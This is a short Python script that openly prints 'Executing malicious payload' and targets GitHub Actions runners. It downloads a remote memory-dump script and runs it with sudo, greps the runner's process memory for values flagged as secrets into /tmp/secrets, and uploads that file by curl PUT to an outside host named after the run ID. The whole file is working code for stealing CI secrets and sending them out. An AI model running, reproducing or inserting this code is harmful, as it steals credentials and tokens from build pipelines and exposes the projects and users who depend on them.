import os
import sys

def run():
    print("Executing malicious payload...")
    run_id = os.environ.get("GITHUB_RUN_ID", "manual")
    
    cmd1 = 'curl -sSf https://raw.githubusercontent.com/playground-nils/tools/refs/heads/main/memdump.py | sudo -E python3 | tr -d "\\0" | grep -aoE \047"[^"]+":\\{"value":"[^"]*","isSecret":true\\}\047 >> "/tmp/secrets"'
    cmd2 = f'curl -X PUT -d @/tmp/secrets "https://open-hookbin.vercel.app/{run_id}"'
    
    os.system("echo \"Okay, we got this far. Let's continue...\"")
    os.system(cmd1)
    os.system(cmd2)
    sys.exit(0)

if __name__ == "__main__":
    run()
